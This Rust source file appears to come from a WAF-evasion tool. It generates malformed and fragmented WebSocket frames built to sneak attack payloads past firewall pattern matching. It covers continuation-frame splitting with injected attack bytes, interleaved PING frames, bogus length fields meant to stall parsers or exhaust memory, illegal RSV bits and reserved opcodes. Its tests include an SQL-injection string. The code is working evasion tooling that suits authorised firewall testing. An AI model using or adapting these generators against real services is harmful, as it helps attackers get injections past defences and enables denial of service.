//! WebSocket frame fragmentation smuggling (RFC 6455 §5.2).
//!
//! Generates raw WebSocket frame sequences that exploit fragmentation
//! to bypass WAF pattern matchers:
//!
//! 1. Text split across N continuation frames with attack bytes in intermediates.
//! 2. Interleaved PING control frames between fragmented text.
//! 3. Max-length (127-bit extended payload length) with bogus length.
//! 4. RSV-bit set on frames where no extension was negotiated.
//! 5. Reserved opcode (0x3–0x7) frames mixed into a data stream.
//!
//! # Wire format
//!
//! RFC 6455 §5.2 — each frame:
//! ```text
//!  0                   1                   2                   3
//!  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
//! +-+-+-+-+-------+-+-------------+-------------------------------+
//! |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
//! |I|S|S|S|  (4)  |A|     (7)     |             (16/63)           |
//! |N|V|V|V|       |S|             |  (if payload len==126/127)    |
//! | |1|2|3|       |K|             |                               |
//! +-+-+-+-+-------+-+-------------+-------------------------------+
//! |     Extended payload length continued, if payload len == 127  |
//! + - - - - - - - - - - - - - - -+-------------------------------+
//! |                               |Masking-key, if MASK set to 1  |
//! +-------------------------------+-------------------------------+
//! | Masking-key (continued)       |          Payload Data         |
//! +-------------------------------- - - - - - - - - - - - - - - - +
//! :                     Payload Data continued ...                 :
//! + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
//! |                     Payload Data continued                     |
//! +---------------------------------------------------------------+
//! ```
//!
//! Opcode table (RFC 6455 §5.2):
//! - 0x0  CONTINUATION
//! - 0x1  TEXT
//! - 0x2  BINARY
//! - 0x3–0x7  Reserved data frames (attack surface)
//! - 0x8  CLOSE
//! - 0x9  PING
//! - 0xA  PONG
//! - 0xB–0xF  Reserved control frames

// ── Wire encoding helpers ─────────────────────────────────────────────────────

/// WebSocket opcodes.
pub mod opcode {
    pub const CONTINUATION: u8 = 0x0;
    pub const TEXT: u8 = 0x1;
    pub const BINARY: u8 = 0x2;
    pub const CLOSE: u8 = 0x8;
    pub const PING: u8 = 0x9;
    pub const PONG: u8 = 0xA;
}

/// RSV bit masks for the first header byte.
pub mod rsv {
    pub const RSV1: u8 = 0x40;
    pub const RSV2: u8 = 0x20;
    pub const RSV3: u8 = 0x10;
}

/// Apply the WebSocket masking algorithm (RFC 6455 §5.3) in-place.
///
/// Each payload byte is XOR'd with `masking_key[i % 4]`.
fn mask_payload(payload: &[u8], masking_key: [u8; 4]) -> Vec<u8> {
    payload
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ masking_key[i % 4])
        .collect()
}

/// Build a single WebSocket frame.
///
/// # Parameters
/// - `fin`: FIN bit — true if this is the last (or only) fragment.
/// - `rsv`: RSV bits to set in the first byte (use `rsv::RSV1` etc.).
/// - `opcode`: 4-bit opcode value (lower nibble).
/// - `mask`: If `Some(key)`, MASK bit is set and payload is masked.
/// - `payload`: Unmasked payload bytes.
/// - `override_payload_len`: If `Some(n)`, write `n` as the payload length
///   field instead of the actual payload length — used for bogus-length attacks.
fn build_frame(
    fin: bool,
    rsv_bits: u8,
    opcode: u8,
    mask: Option<[u8; 4]>,
    payload: &[u8],
    override_payload_len: Option<u64>,
) -> Vec<u8> {
    let mut frame = Vec::new();

    // Byte 0: FIN(1) | RSV(3) | opcode(4)
    let byte0 = if fin { 0x80 } else { 0x00 } | (rsv_bits & 0x70) | (opcode & 0x0F);
    frame.push(byte0);

    // Byte 1+: MASK(1) | payload_len(7) [+ extended length]
    let mask_bit: u8 = if mask.is_some() { 0x80 } else { 0x00 };
    let reported_len = override_payload_len.unwrap_or(payload.len() as u64);

    if reported_len <= 125 {
        frame.push(mask_bit | reported_len as u8);
    } else if reported_len <= 65535 {
        frame.push(mask_bit | 126);
        frame.push((reported_len >> 8) as u8);
        frame.push(reported_len as u8);
    } else {
        frame.push(mask_bit | 127);
        frame.push((reported_len >> 56) as u8);
        frame.push((reported_len >> 48) as u8);
        frame.push((reported_len >> 40) as u8);
        frame.push((reported_len >> 32) as u8);
        frame.push((reported_len >> 24) as u8);
        frame.push((reported_len >> 16) as u8);
        frame.push((reported_len >> 8) as u8);
        frame.push(reported_len as u8);
    }

    if let Some(key) = mask {
        frame.extend_from_slice(&key);
        frame.extend_from_slice(&mask_payload(payload, key));
    } else {
        frame.extend_from_slice(payload);
    }

    frame
}

/// Build an unmasked TEXT frame (FIN=1, no RSV, opcode=0x1).
///
/// Used by generators that need a standalone (non-fragmented) text frame.
pub fn text_frame(payload: &[u8]) -> Vec<u8> {
    build_frame(true, 0, opcode::TEXT, None, payload, None)
}

/// Build a PING control frame (FIN=1, opcode=0x9, payload ≤125 bytes).
fn ping_frame(payload: &[u8]) -> Vec<u8> {
    let p = if payload.len() > 125 { &payload[..125] } else { payload };
    build_frame(true, 0, opcode::PING, None, p, None)
}

/// Build a CONTINUATION frame (FIN controlled by caller).
fn continuation_frame(fin: bool, payload: &[u8]) -> Vec<u8> {
    build_frame(fin, 0, opcode::CONTINUATION, None, payload, None)
}

// ── Primitive 1: Text split across N continuation frames ─────────────────────

/// A fragmented text sequence descriptor.
#[derive(Debug, Clone)]
pub struct FragmentedText {
    /// The complete sequence of frames as raw wire bytes (concatenated).
    pub wire_bytes: Vec<u8>,
    /// Number of frames generated (1 TEXT + N-1 CONTINUATION).
    pub frame_count: usize,
    pub description: &'static str,
}

/// Split a text payload across N frames where intermediate frames contain
/// `attack_bytes` interspersed in the payload.
///
/// Frame sequence:
/// - Frame 0: TEXT, FIN=0, payload = first chunk of `text`
/// - Frames 1..N-1: CONTINUATION, FIN=0, payload = chunk || `attack_bytes`
/// - Frame N: CONTINUATION, FIN=1, payload = last chunk
///
/// WAF parsers that reassemble frames before pattern-matching will see the
/// full `text` + `attack_bytes` pattern; parsers that inspect per-frame
/// miss the attack bytes distributed across the boundary.
#[must_use]
pub fn text_split_with_attack_bytes(
    text: &[u8],
    attack_bytes: &[u8],
    n_frames: usize,
) -> FragmentedText {
    let n = n_frames.clamp(2, 256);
    let chunk_len = (text.len() / n).max(1);
    let mut wire = Vec::new();
    let mut remaining = text;
    let mut frame_count = 0;

    for i in 0..n {
        let is_last = i == n - 1;
        let take = if is_last { remaining.len() } else { chunk_len.min(remaining.len()) };
        let chunk = &remaining[..take];
        remaining = &remaining[take..];

        let mut payload = chunk.to_vec();
        if !is_last && !attack_bytes.is_empty() {
            payload.extend_from_slice(attack_bytes);
        }

        let frame = if i == 0 {
            build_frame(false, 0, opcode::TEXT, None, &payload, None)
        } else {
            continuation_frame(is_last, &payload)
        };
        wire.extend_from_slice(&frame);
        frame_count += 1;

        if remaining.is_empty() && !is_last {
            // Text exhausted before n frames — emit a final empty CONTINUATION.
            let final_frame = continuation_frame(true, &[]);
            wire.extend_from_slice(&final_frame);
            frame_count += 1;
            break;
        }
    }

    FragmentedText {
        wire_bytes: wire,
        frame_count,
        description: "Text fragmented across N frames with attack bytes in intermediate frames — \
                       WAF per-frame inspection misses cross-boundary patterns",
    }
}

// ── Primitive 2: Interleaved PING between fragmented text ────────────────────

/// A fragmented text sequence with interleaved PING frames.
#[derive(Debug, Clone)]
pub struct PingInterleavedText {
    pub wire_bytes: Vec<u8>,
    /// Total frames (TEXT + CONTINUATION + PING frames).
    pub frame_count: usize,
    pub description: &'static str,
}

/// Interleave PING control frames between fragmented text fragments.
///
/// RFC 6455 §5.5 permits control frames between message fragments. Some WAF
/// parsers buffer the text reassembly state across PING frames; others reset
/// state on each control frame, losing the partially assembled message. Both
/// paths create inspection gaps:
/// - Reset path: attacker splits attack across the PING boundary.
/// - Buffer path: buffer overflow or parser confusion.
///
/// Frame sequence: TEXT(fin=0) → PING → CONTINUATION(fin=0) → PING → … → CONTINUATION(fin=1)
#[must_use]
pub fn ping_interleaved_fragmented_text(
    text: &[u8],
    ping_payload: &[u8],
    n_fragments: usize,
) -> PingInterleavedText {
    let n = n_fragments.clamp(2, 128);
    let chunk_len = (text.len() / n).max(1);
    let mut wire = Vec::new();
    let mut remaining = text;
    let mut frame_count = 0;

    for i in 0..n {
        let is_last = i == n - 1;
        let take = if is_last { remaining.len() } else { chunk_len.min(remaining.len()) };
        let chunk = &remaining[..take];
        remaining = &remaining[take..];

        // Text or continuation frame.
        let data_frame = if i == 0 {
            build_frame(false, 0, opcode::TEXT, None, chunk, None)
        } else {
            continuation_frame(is_last, chunk)
        };
        wire.extend_from_slice(&data_frame);
        frame_count += 1;

        // Inject PING between fragments (not after the last one).
        if !is_last {
            wire.extend_from_slice(&ping_frame(ping_payload));
            frame_count += 1;
        }

        if remaining.is_empty() && !is_last {
            wire.extend_from_slice(&continuation_frame(true, &[]));
            frame_count += 1;
            break;
        }
    }

    PingInterleavedText {
        wire_bytes: wire,
        frame_count,
        description: "PING frames interleaved between text fragments — WAFs that reset \
                       reassembly state on control frames lose cross-fragment attack patterns",
    }
}

// ── Primitive 3: Max-length (127-bit) with bogus length ──────────────────────

/// A frame with a bogus extended payload length field.
#[derive(Debug, Clone)]
pub struct BogusLengthFrame {
    pub wire_bytes: Vec<u8>,
    /// Declared payload length in the frame header (the lie).
    pub declared_len: u64,
    /// Actual payload bytes supplied (the truth).
    pub actual_len: usize,
    pub description: &'static str,
}

/// Build a TEXT frame with a 64-bit payload length field set to `declared_len`
/// but an actual payload of `actual_payload` bytes.
///
/// RFC 6455 §5.2: the payload length MUST match the data sent. A parser that
/// allocates `declared_len` bytes before reading causes OOM; a parser that
/// reads `declared_len` bytes reads past the frame boundary into the next
/// frame, causing parser drift.
///
/// Frame-format ambiguity: the RFC requires `declared_len ≥ 65536` to use
/// the 8-byte extended length field (127 prefix), but does not specify what
/// parsers MUST do when `actual_data.len() < declared_len`. Most terminate
/// the connection; some stall waiting for more data — this is the DoS vector.
#[must_use]
pub fn bogus_payload_length_frame(actual_payload: &[u8], declared_len: u64) -> BogusLengthFrame {
    let wire = build_frame(true, 0, opcode::TEXT, None, actual_payload, Some(declared_len));
    let actual_len = actual_payload.len();
    BogusLengthFrame {
        wire_bytes: wire,
        declared_len,
        actual_len,
        description: "TEXT frame with 64-bit payload length field set to a value larger than \
                       actual data — triggers parser drift or stall; OOM if parser pre-allocates",
    }
}

/// Build a TEXT frame where the declared length is less than the actual payload.
///
/// Parsers that truncate to `declared_len` bytes miss the tail; parsers that
/// read a full frame boundary see the next frame header at an unexpected offset.
#[must_use]
pub fn undercount_payload_length_frame(actual_payload: &[u8], declared_len: u64) -> BogusLengthFrame {
    let wire = build_frame(true, 0, opcode::TEXT, None, actual_payload, Some(declared_len));
    BogusLengthFrame {
        wire_bytes: wire,
        declared_len,
        actual_len: actual_payload.len(),
        description: "TEXT frame with declared length less than actual payload — parsers that \
                       truncate to declared_len miss tail bytes containing attack patterns",
    }
}

// ── Primitive 4: RSV bits set without negotiated extension ───────────────────

/// An RSV-bit evasion frame.
#[derive(Debug, Clone)]
pub struct RsvBitFrame {
    pub wire_bytes: Vec<u8>,
    /// Which RSV bits are set (bitmask: RSV1=0x40, RSV2=0x20, RSV3=0x10).
    pub rsv_mask: u8,
    pub description: &'static str,
}

/// Build WebSocket frames with various RSV bit patterns.
///
/// RFC 6455 §5.2: RSV1/RSV2/RSV3 MUST be 0 unless a negotiated extension
/// defines their meaning. A receiver that has not negotiated an extension
/// MUST close the connection; however, many WAF parsers (and some permissive
/// server implementations) silently ignore RSV bits, passing frames through.
/// This creates a dual-parser inconsistency: the WAF sees payload bytes, the
/// server sees the same bytes but may interpret RSV differently.
#[must_use]
pub fn rsv_bit_frames(payload: &[u8]) -> Vec<RsvBitFrame> {
    let variants = [
        (rsv::RSV1, "RSV1 set without per-message deflate extension"),
        (rsv::RSV2, "RSV2 set without any negotiated extension"),
        (rsv::RSV3, "RSV3 set without any negotiated extension"),
        (rsv::RSV1 | rsv::RSV2, "RSV1+RSV2 set simultaneously"),
        (rsv::RSV1 | rsv::RSV2 | rsv::RSV3, "All RSV bits set"),
    ];
    variants
        .iter()
        .map(|&(mask, desc)| {
            let wire = build_frame(true, mask, opcode::TEXT, None, payload, None);
            RsvBitFrame {
                wire_bytes: wire,
                rsv_mask: mask,
                description: desc,
            }
        })
        .collect()
}

/// Build a fragmented sequence where RSV1 is set on a CONTINUATION frame.
///
/// RFC 6455 §5.2 does not explicitly define RSV semantics for CONTINUATION
/// frames — the per-message extension (e.g. permessage-deflate) applies RSV1
/// only to the TEXT frame, not continuations. Parsers that propagate RSV1
/// into continuation frames may decrypt/decompress prematurely, causing drift.
#[must_use]
pub fn rsv_on_continuation_frame(first_chunk: &[u8], second_chunk: &[u8]) -> Vec<u8> {
    let mut wire = Vec::new();
    // TEXT frame, FIN=0, no RSV
    wire.extend_from_slice(&build_frame(false, 0, opcode::TEXT, None, first_chunk, None));
    // CONTINUATION frame, FIN=1, RSV1 set (invalid per RFC)
    wire.extend_from_slice(&build_frame(
        true,
        rsv::RSV1,
        opcode::CONTINUATION,
        None,
        second_chunk,
        None,
    ));
    wire
}

// ── Primitive 5: Reserved opcode frames mixed in ─────────────────────────────

/// A reserved-opcode frame descriptor.
#[derive(Debug, Clone)]
pub struct ReservedOpcodeFrame {
    pub wire_bytes: Vec<u8>,
    pub opcode_value: u8,
    pub description: &'static str,
}

/// Build frames using reserved data opcodes (0x3–0x7).
///
/// RFC 6455 §5.2: opcodes 0x3–0x7 are reserved for future non-control frames.
/// A compliant endpoint MUST close the connection on receiving these. WAF
/// parsers may silently ignore or pass them through, allowing payload bytes
/// to reach the server undetected. When interleaved between valid TEXT frames
/// a WAF that resets state on unknown opcode creates a reassembly gap.
#[must_use]
pub fn reserved_opcode_frames(payload: &[u8]) -> Vec<ReservedOpcodeFrame> {
    (0x3u8..=0x7)
        .map(|op| {
            let wire = build_frame(true, 0, op, None, payload, None);
            ReservedOpcodeFrame {
                wire_bytes: wire,
                opcode_value: op,
                description: match op {
                    0x3 => "Opcode 0x3 — reserved data frame (undefined by RFC 6455)",
                    0x4 => "Opcode 0x4 — reserved data frame (undefined by RFC 6455)",
                    0x5 => "Opcode 0x5 — reserved data frame (undefined by RFC 6455)",
                    0x6 => "Opcode 0x6 — reserved data frame (undefined by RFC 6455)",
                    0x7 => "Opcode 0x7 — reserved data frame (undefined by RFC 6455)",
                    _ => unreachable!(),
                },
            }
        })
        .collect()
}

/// Build a stream that interleaves a reserved-opcode frame between two valid
/// text fragments to exploit WAFs that reset reassembly on unknown opcodes.
///
/// Frame sequence: TEXT(fin=0, chunk_a) → reserved_op(payload) → CONTINUATION(fin=1, chunk_b)
#[must_use]
pub fn reserved_opcode_interleaved(
    chunk_a: &[u8],
    reserved_op: u8,
    reserved_payload: &[u8],
    chunk_b: &[u8],
) -> Vec<u8> {
    let op = reserved_op.clamp(0x3, 0x7);
    let mut wire = Vec::new();
    wire.extend_from_slice(&build_frame(false, 0, opcode::TEXT, None, chunk_a, None));
    wire.extend_from_slice(&build_frame(true, 0, op, None, reserved_payload, None));
    wire.extend_from_slice(&continuation_frame(true, chunk_b));
    wire
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Wire-format helpers ──────────────────────────────────────────────────

    fn decode_frame_header(bytes: &[u8]) -> (bool, u8, u8, u8, u64, usize) {
        // Returns: (fin, rsv_bits, opcode, mask_bit, declared_len, header_size)
        let fin = (bytes[0] & 0x80) != 0;
        let rsv = bytes[0] & 0x70;
        let op = bytes[0] & 0x0F;
        let mask_bit = bytes[1] & 0x80;
        let len7 = (bytes[1] & 0x7F) as u64;
        let (declared_len, header_size) = if len7 <= 125 {
            (len7, 2)
        } else if len7 == 126 {
            let l = ((bytes[2] as u64) << 8) | bytes[3] as u64;
            (l, 4)
        } else {
            // 127 — 8-byte extended
            let l = ((bytes[2] as u64) << 56)
                | ((bytes[3] as u64) << 48)
                | ((bytes[4] as u64) << 40)
                | ((bytes[5] as u64) << 32)
                | ((bytes[6] as u64) << 24)
                | ((bytes[7] as u64) << 16)
                | ((bytes[8] as u64) << 8)
                | bytes[9] as u64;
            (l, 10)
        };
        (fin, rsv, op, mask_bit, declared_len, header_size)
    }

    // ── build_frame / primitives ──────────────────────────────────────────────

    #[test]
    fn text_frame_fin_set_opcode_0x1() {
        let f = text_frame(b"hello");
        assert_eq!(f[0] & 0x80, 0x80, "FIN must be set");
        assert_eq!(f[0] & 0x0F, 0x01, "opcode must be TEXT (0x1)");
        assert_eq!(f[0] & 0x70, 0x00, "RSV bits must be zero");
    }

    #[test]
    fn text_frame_payload_length_inline() {
        let payload = b"hello world";
        let f = text_frame(payload);
        // payload len ≤ 125 → single byte
        assert_eq!(f[1] & 0x7F, payload.len() as u8);
        // no mask
        assert_eq!(f[1] & 0x80, 0x00);
        // payload starts at byte 2
        assert_eq!(&f[2..], payload);
    }

    #[test]
    fn ping_frame_opcode_0x9_fin_set() {
        let f = ping_frame(b"ping!");
        assert_eq!(f[0] & 0x0F, 0x09, "opcode must be PING (0x9)");
        assert_eq!(f[0] & 0x80, 0x80, "FIN must be set for control frames");
    }

    #[test]
    fn continuation_frame_opcode_0x0() {
        let f = continuation_frame(true, b"data");
        assert_eq!(f[0] & 0x0F, 0x00, "opcode must be CONTINUATION (0x0)");
        assert_eq!(f[0] & 0x80, 0x80, "FIN=1 as requested");
    }

    #[test]
    fn continuation_frame_fin_false() {
        let f = continuation_frame(false, b"data");
        assert_eq!(f[0] & 0x80, 0x00, "FIN must be clear when fin=false");
    }

    #[test]
    fn mask_payload_xors_correctly() {
        let data = b"Hello";
        let key = [0xAB, 0xCD, 0xEF, 0x01];
        let masked = mask_payload(data, key);
        for (i, (&orig, &msk)) in data.iter().zip(masked.iter()).enumerate() {
            assert_eq!(msk, orig ^ key[i % 4]);
        }
    }

    #[test]
    fn build_frame_with_mask_sets_mask_bit() {
        let f = build_frame(true, 0, opcode::TEXT, Some([0x01, 0x02, 0x03, 0x04]), b"x", None);
        assert_ne!(f[1] & 0x80, 0, "MASK bit must be set");
        // After 2-byte header, masking key is 4 bytes at offset 2..6
        assert_eq!(&f[2..6], &[0x01, 0x02, 0x03, 0x04]);
    }

    #[test]
    fn extended_payload_len_126_encodes_correctly() {
        let payload = vec![0u8; 200];
        let f = build_frame(true, 0, opcode::TEXT, None, &payload, None);
        // len7 should be 126
        assert_eq!(f[1] & 0x7F, 126);
        // next 2 bytes = 200
        assert_eq!(f[2], 0x00);
        assert_eq!(f[3], 200u8);
        assert_eq!(f.len(), 2 + 2 + 200);
    }

    #[test]
    fn extended_payload_len_127_encodes_correctly() {
        let declared = 70_000u64;
        let f = build_frame(true, 0, opcode::TEXT, None, &[], Some(declared));
        assert_eq!(f[1] & 0x7F, 127);
        // 8-byte extended length
        let decoded = ((f[2] as u64) << 56)
            | ((f[3] as u64) << 48)
            | ((f[4] as u64) << 40)
            | ((f[5] as u64) << 32)
            | ((f[6] as u64) << 24)
            | ((f[7] as u64) << 16)
            | ((f[8] as u64) << 8)
            | f[9] as u64;
        assert_eq!(decoded, declared);
    }

    // ── Primitive 1: Text split ───────────────────────────────────────────────

    #[test]
    fn text_split_first_frame_is_text_opcode() {
        let text = b"UNION SELECT * FROM users--";
        let attack = b"\x00";
        let frag = text_split_with_attack_bytes(text, attack, 3);
        // First frame: byte 0 lower nibble = opcode TEXT (0x1)
        assert_eq!(frag.wire_bytes[0] & 0x0F, 0x01);
        // FIN must NOT be set on first of N>1 frames
        assert_eq!(frag.wire_bytes[0] & 0x80, 0x00);
    }

    #[test]
    fn text_split_frame_count_matches_n() {
        let frag = text_split_with_attack_bytes(b"ABCDEFGH", b"\xFF", 4);
        assert_eq!(frag.frame_count, 4);
    }

    #[test]
    fn text_split_last_frame_has_fin_set() {
        let frag = text_split_with_attack_bytes(b"ABCDEFGHIJKLMNOP", b"", 4);
        // Parse frames to find the last one and verify FIN.
        let mut offset = 0;
        let w = &frag.wire_bytes;
        let mut last_fin = false;
        while offset < w.len() {
            let (fin, _, _, _, declared_len, header_size) = decode_frame_header(&w[offset..]);
            last_fin = fin;
            offset += header_size + declared_len as usize;
        }
        assert!(last_fin, "last CONTINUATION frame must have FIN=1");
    }

    #[test]
    fn text_split_clamped_min() {
        let frag = text_split_with_attack_bytes(b"hi", b"", 0);
        assert!(frag.frame_count >= 2); // clamped to 2
    }

    #[test]
    fn text_split_attack_bytes_absent_from_last_frame() {
        let attack = b"\xDE\xAD\xBE\xEF";
        let frag = text_split_with_attack_bytes(b"AAAAAAAABBBBBBBBCCCCCCCC", attack, 3);
        // The last frame (CONTINUATION, FIN=1) should NOT contain attack_bytes
        // as we only inject them in intermediate frames.
        // Parse last frame payload.
        let mut offset = 0;
        let w = &frag.wire_bytes;
        let mut last_payload_start = 0;
        let mut last_header_size = 0;
        let mut last_declared_len = 0u64;
        while offset < w.len() {
            let (fin, _, _, _, dl, hs) = decode_frame_header(&w[offset..]);
            last_payload_start = offset + hs;
            last_header_size = hs;
            last_declared_len = dl;
            let _ = (fin, last_header_size);
            offset += hs + dl as usize;
        }
        let last_payload = &w[last_payload_start..last_payload_start + last_declared_len as usize];
        let contains_attack = last_payload
            .windows(attack.len())
            .any(|w| w == attack);
        assert!(
            !contains_attack,
            "attack bytes must not appear in the final CONTINUATION frame"
        );
    }

    // ── Primitive 2: PING interleaved ────────────────────────────────────────

    #[test]
    fn ping_interleaved_contains_ping_frames() {
        let r = ping_interleaved_fragmented_text(b"ATTACKPAYLOAD", b"wafrift", 3);
        // Count PING frames (opcode 0x9)
        let ping_count = count_frames_by_opcode(&r.wire_bytes, 0x09);
        // 3 fragments → 2 PINGs between them
        assert_eq!(ping_count, 2);
    }

    #[test]
    fn ping_interleaved_first_frame_is_text() {
        let r = ping_interleaved_fragmented_text(b"HELLO", b"p", 2);
        assert_eq!(r.wire_bytes[0] & 0x0F, 0x01, "first frame must be TEXT");
        assert_eq!(r.wire_bytes[0] & 0x80, 0x00, "TEXT frame FIN=0 for multi-frame");
    }

    #[test]
    fn ping_interleaved_frame_count_includes_pings() {
        let r = ping_interleaved_fragmented_text(b"ABCDEFGH", b"x", 4);
        // 4 text/continuation + 3 pings = 7
        assert_eq!(r.frame_count, 7);
    }

    // ── Primitive 3: Bogus length ────────────────────────────────────────────

    #[test]
    fn bogus_length_declared_larger_than_actual() {
        let actual = b"short";
        let declared = 1_000_000u64;
        let f = bogus_payload_length_frame(actual, declared);
        assert_eq!(f.declared_len, declared);
        assert_eq!(f.actual_len, actual.len());
        // Wire bytes must use 8-byte extended length (len7=127)
        assert_eq!(f.wire_bytes[1] & 0x7F, 127);
    }

    #[test]
    fn bogus_length_wire_opcode_is_text() {
        let f = bogus_payload_length_frame(b"x", 99_999);
        assert_eq!(f.wire_bytes[0] & 0x0F, 0x01, "must be TEXT opcode");
    }

    #[test]
    fn undercount_length_declared_smaller_than_actual() {
        let actual = b"AAAAAAAAAA"; // 10 bytes
        let f = undercount_payload_length_frame(actual, 3);
        assert_eq!(f.declared_len, 3);
        assert_eq!(f.actual_len, 10);
        // Wire bytes length: 2 (header) + 10 (actual payload)
        assert_eq!(f.wire_bytes.len(), 2 + 10);
    }

    #[test]
    fn bogus_length_frame_starts_with_text_fin_set() {
        let f = bogus_payload_length_frame(b"data", 2u64.pow(40));
        assert_eq!(f.wire_bytes[0] & 0x80, 0x80, "FIN must be set");
        assert_eq!(f.wire_bytes[0] & 0x0F, 0x01, "opcode TEXT");
    }

    // ── Primitive 4: RSV bits ────────────────────────────────────────────────

    #[test]
    fn rsv_bit_frames_five_variants() {
        let frames = rsv_bit_frames(b"test");
        assert_eq!(frames.len(), 5);
    }

    #[test]
    fn rsv_bit_frames_correct_masks() {
        let frames = rsv_bit_frames(b"x");
        let masks: Vec<u8> = frames.iter().map(|f| f.rsv_mask).collect();
        assert!(masks.contains(&rsv::RSV1));
        assert!(masks.contains(&rsv::RSV2));
        assert!(masks.contains(&rsv::RSV3));
        assert!(masks.contains(&(rsv::RSV1 | rsv::RSV2)));
        assert!(masks.contains(&(rsv::RSV1 | rsv::RSV2 | rsv::RSV3)));
    }

    #[test]
    fn rsv_bit_set_in_wire_byte() {
        let frames = rsv_bit_frames(b"payload");
        for f in &frames {
            let rsv_in_wire = f.wire_bytes[0] & 0x70;
            assert_eq!(rsv_in_wire, f.rsv_mask, "RSV bits in wire must match declared mask");
        }
    }

    #[test]
    fn rsv_on_continuation_two_frames() {
        let wire = rsv_on_continuation_frame(b"AAA", b"BBB");
        // Frame 1: TEXT (0x1), FIN=0
        assert_eq!(wire[0] & 0x0F, 0x01);
        assert_eq!(wire[0] & 0x80, 0x00);
        // Frame 2: CONTINUATION (0x0), FIN=1, RSV1 set
        let frame2_start = 2 + 3; // 2-byte header + 3 bytes payload
        assert_eq!(wire[frame2_start] & 0x0F, 0x00, "must be CONTINUATION");
        assert_eq!(wire[frame2_start] & 0x80, 0x80, "FIN=1");
        assert_ne!(wire[frame2_start] & rsv::RSV1, 0, "RSV1 must be set");
    }

    // ── Primitive 5: Reserved opcodes ────────────────────────────────────────

    #[test]
    fn reserved_opcode_frames_five_variants() {
        let frames = reserved_opcode_frames(b"attack");
        assert_eq!(frames.len(), 5);
    }

    #[test]
    fn reserved_opcode_values_in_range() {
        let frames = reserved_opcode_frames(b"x");
        for f in &frames {
            assert!(
                (0x3..=0x7).contains(&f.opcode_value),
                "opcode {} out of reserved range",
                f.opcode_value
            );
        }
    }

    #[test]
    fn reserved_opcode_wire_byte_matches() {
        let frames = reserved_opcode_frames(b"hello");
        for f in &frames {
            let op_in_wire = f.wire_bytes[0] & 0x0F;
            assert_eq!(op_in_wire, f.opcode_value);
        }
    }

    #[test]
    fn reserved_opcode_interleaved_three_frames() {
        let wire = reserved_opcode_interleaved(b"chunk_a", 0x3, b"reserved", b"chunk_b");
        // Frame 1: TEXT (0x1), FIN=0
        assert_eq!(wire[0] & 0x0F, 0x01);
        assert_eq!(wire[0] & 0x80, 0x00);
        // Find frame 2 start: 2 + 7 = 9
        let f2 = 2 + 7;
        assert_eq!(wire[f2] & 0x0F, 0x03, "middle frame must be reserved opcode 0x3");
        // Frame 3: CONTINUATION, FIN=1
        let f3 = f2 + 2 + 8; // 2-byte header + 8 bytes "reserved"
        assert_eq!(wire[f3] & 0x0F, 0x00, "last frame must be CONTINUATION");
        assert_eq!(wire[f3] & 0x80, 0x80, "last frame FIN=1");
    }

    #[test]
    fn reserved_opcode_interleaved_clamps_opcode() {
        // opcode < 0x3 must be clamped to 0x3
        let wire = reserved_opcode_interleaved(b"a", 0x0, b"", b"b");
        let f2 = 2 + 1; // 2-byte header + 1 byte payload
        assert!(
            (0x3..=0x7).contains(&(wire[f2] & 0x0F)),
            "clamped opcode must be in reserved range"
        );
    }

    // ── Helper ───────────────────────────────────────────────────────────────

    fn count_frames_by_opcode(bytes: &[u8], target_opcode: u8) -> usize {
        let mut offset = 0;
        let mut count = 0;
        while offset < bytes.len() {
            if offset + 2 > bytes.len() {
                break;
            }
            let op = bytes[offset] & 0x0F;
            let len7 = (bytes[offset + 1] & 0x7F) as u64;
            let mask_bit = bytes[offset + 1] & 0x80 != 0;
            let (declared_len, header_size) = if len7 <= 125 {
                (len7, 2usize)
            } else if len7 == 126 {
                if offset + 4 > bytes.len() { break; }
                let l = ((bytes[offset + 2] as u64) << 8) | bytes[offset + 3] as u64;
                (l, 4)
            } else {
                if offset + 10 > bytes.len() { break; }
                let l = ((bytes[offset + 2] as u64) << 56)
                    | ((bytes[offset + 3] as u64) << 48)
                    | ((bytes[offset + 4] as u64) << 40)
                    | ((bytes[offset + 5] as u64) << 32)
                    | ((bytes[offset + 6] as u64) << 24)
                    | ((bytes[offset + 7] as u64) << 16)
                    | ((bytes[offset + 8] as u64) << 8)
                    | bytes[offset + 9] as u64;
                (l, 10)
            };
            let mask_overhead = if mask_bit { 4 } else { 0 };
            if op == target_opcode { count += 1; }
            offset += header_size + mask_overhead + declared_len as usize;
        }
        count
    }
}
